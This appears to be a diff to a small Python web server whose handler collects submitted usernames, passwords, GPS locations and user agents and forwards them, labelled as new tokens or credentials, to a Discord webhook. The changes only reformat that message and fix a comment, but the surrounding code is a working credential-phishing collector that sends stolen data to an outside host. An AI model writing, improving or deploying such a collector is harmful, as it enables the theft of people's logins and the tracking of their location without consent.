@@ -19,7 +19,13 @@ class MyHandler(SimpleHTTPRequestHandler):
             now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
             # Envoi vers Discord
-            msg = f"--- NOUVEAU TOKEN / IDENTIFIANT [{now}] ---\nUtilisateur : {data.get('username')}\nMot de passe : {data.get('password')}\nGPS : {data.get('location')}\nUser-Agent : {data.get('userAgent')}"
+            msg = (
+                f"--- NOUVEAU TOKEN / IDENTIFIANT [{now}] ---\n"
+                f"Utilisateur : {data.get('username')}\n"
+                f"Mot de passe : {data.get('password')}\n"
+                f"GPS : {data.get('location')}\n"
+                f"User-Agent : {data.get('userAgent')}"
+            )
             payload = json.dumps({"content": msg}).encode('utf-8')
             req = urllib.request.Request(WEBHOOK_URL, data=payload, headers={'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'})
             try:
@@ -35,7 +41,7 @@ class MyHandler(SimpleHTTPRequestHandler):
         else:
             self.send_error(404, "Page non trouvée")
 
-Lancement du serveur
+# Lancement du serveur
 server_address = ('', 8080)
 httpd = HTTPServer(server_address, MyHandler)
 print("Serveur lancé avec succès sur le port 8080...")
